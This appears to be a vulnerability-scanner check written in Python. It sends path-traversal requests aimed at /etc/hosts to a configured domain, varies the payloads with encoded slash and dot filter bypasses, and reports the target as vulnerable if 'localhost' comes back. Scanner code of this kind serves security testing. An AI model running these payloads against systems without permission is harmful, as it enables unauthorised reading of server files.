import requests
import os
import json

default_payload = '../../../../../../../../etc/hosts'

url = 'https://{0}/'.format(os.environ.get('DOMAIN'))
vuln_id = os.environ.get('VULN_ID')


def resp(state=False):
    if state:
        return json.dumps({"vulnerable": "True", "vuln_id": vuln_id, "description": url})
    else:
        return json.dumps({"vulnerable": "False", "vuln_id": vuln_id, "description": url})


def build_payoad():
    bypasses = {
        '/': ['\\', '%2f', '%5c'],
        '..': ['...', '.', 'NN', '%2e']
    }
    payload_list_draft = []
    payload_list = []
    for slash in bypasses.get('/'):
        payload_list_draft.append(default_payload.replace('/', slash))
    for dot in bypasses.get('..'):
        payload_list_draft.append(default_payload.replace('..', dot))
    for character in bypasses:
        for bypass_char in bypasses[character]:
            for payload in payload_list_draft:
                payload_list.append(payload.replace(character, bypass_char))
    return list(set(payload_list))


def check():
    try:
        for payload in build_payoad():
            # inject in url
            if 'localhost' in requests.get(url + payload, timeout=4).content:
                return resp(True)
    except Exception as ex:
        pass
    return resp(False)


if __name__ == '__main__':
    print(check())
